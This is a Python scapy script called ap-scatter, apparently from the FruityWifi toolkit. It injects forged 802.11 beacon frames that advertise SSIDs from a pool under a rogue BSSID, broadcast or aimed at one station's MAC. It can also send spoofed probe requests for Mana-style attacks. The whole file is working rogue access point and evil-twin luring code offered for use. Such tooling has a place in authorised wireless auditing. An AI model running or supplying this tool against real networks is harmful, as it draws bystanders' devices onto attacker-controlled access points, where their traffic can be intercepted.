#!/usr/bin/env python

import sys
from scapy.all import *
import getopt
import time

# ------- MENU -------
def usage():
    print "\nap-scatter 1.0 by xtr4nge"
    
    print "Usage: ap-scatter.py <options>\n"
    print "Options:"
    print "-i <i>, --interface=<i>                  set interface (default: mon0)"
    print "-t <time>, --time=<time>                 scan time (default: 5s)"
    print "-s <filter-station>                      station filter (macaddress)"
    print "-b <bssid>                               Rogue AP (bssid)"
    print "-e <filter>                              Filter ESSID (none, whitelist, blacklist)"
    print "-m <num>                                 Mode Broadcast=1 | Request=2 (use mode 2 with Mana Loud)"
    print "-h                                       Print this help message."
    print ""
    print "Author: xtr4nge"
    print ""

def parseOptions(argv):
    INTERFACE = "mon0"
    TIME =  int(0)
    LOG = ""
    FILTER_STATION = ""
    ROGUE_BSSID = "00:00:00:00:00:01"
    FILTER_SSID = "none"
    MODE = 1

    try:
        opts, args = getopt.getopt(argv, "hi:t:l:b:s:e:m:",
                                   ["help", "interface=", "time=", "log=", "bssid=", "station=", "essid=", "mode="])

        for opt, arg in opts:
            if opt in ("-h", "--help"):
                usage()
                sys.exit()
            elif opt in ("-i", "--interface"):
                INTERFACE = arg
            elif opt in ("-t", "--time"):
                TIME = int(arg)
            elif opt in ("-l", "--log"):
                LOG = arg
                with open(LOG, 'w') as f:
                    f.write("")
            elif opt in ("-b", "--bssid"):
                ROGUE_BSSID = arg
            elif opt in ("-s", "--station"):
                FILTER_STATION = arg
            elif opt in ("-e", "--essid"):
                FILTER_SSID = arg
            elif opt in ("-m", "--mode"):
                MODE = int(arg)
                
        return (INTERFACE, TIME, LOG, ROGUE_BSSID, FILTER_STATION, FILTER_SSID, MODE)
                    
    except getopt.GetoptError:           
        usage()
        sys.exit(2) 

# -------------------------
# GLOBAL VARIABLES
# -------------------------
SSIDS = []
BCAST = "ff:ff:ff:ff:ff:ff"

(INTERFACE, TIME, LOG, ROGUE_BSSID, FILTER_STATION, FILTER_SSID, MODE) = parseOptions(sys.argv[1:])

def loadFILTER():
    FILTER =[]
    TEMP = "/usr/share/fruitywifi/conf/pool-ssid.conf"    
    with open(TEMP) as file:
        for line in file:
            FILTER.append(line.strip())
            
        return FILTER

def loadSSID(FILTER_SSID):
    SSIDS = []
    
    if FILTER_SSID == "whitelist":
        SSIDS = loadFILTER()
        
    elif FILTER_SSID == "blacklist":
        FILTER = loadFILTER()
        TEMP = "/usr/share/fruitywifi/conf/ssid.conf"
        with open(TEMP) as file:
            for line in file:
                if line.strip() not in FILTER:
                    SSIDS.append(line.strip())              
    else:
        TEMP = "/usr/share/fruitywifi/conf/ssid.conf"
        
        with open(TEMP) as file:
            for line in file:
                SSIDS.append(line.strip())
            
    return SSIDS

# FILTER STATION
if FILTER_STATION != "":
    TARGET = FILTER_STATION
else:
    TARGET = BCAST

while True:
    
    SSIDS = loadSSID(FILTER_SSID)
    
    for ESSID in SSIDS:
        
        if MODE == 1:
        	
            # BROADCAST
            print '[*] 802.11 Beacon: SSID=[%s], BSSID=%s, TARGET=%s' % (ESSID, ROGUE_BSSID, TARGET)
            
            p = RadioTap() / Dot11(addr1 = TARGET, addr2 = ROGUE_BSSID, addr3 = ROGUE_BSSID)
            p /= Dot11Beacon(cap = 0x0104)
            p /= Dot11Elt(ID=0, info=ESSID)
            p /= Dot11Elt(ID=1, info="\x82\x84\x8b\x96\x0c\x12\x18\x24")
            p /= Dot11Elt(ID=3, info="\x06")
            p /= Dot11Elt(ID=5, info="\x01\x02\x00\x00")
            sendp(p, iface=INTERFACE, count=10, inter=.1, verbose=0)
        elif MODE == 2:
        	
            # PROBE REQUEST
            print '[*] 802.11 Probe Request: SSID=[%s]' % (ESSID)
            
            STATION = "00:00:00:00:00:10"
            p = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff", addr2=STATION, addr3="ff:ff:ff:ff:ff:ff")
            p /= Dot11Elt(ID=0, info=ESSID)
            p /= Dot11Elt(ID=1, info="\x82\x84\x8b\x96") # All 802.11b rates
            sendp(p, iface=INTERFACE, count=10, inter=.1, verbose=0)
        
        
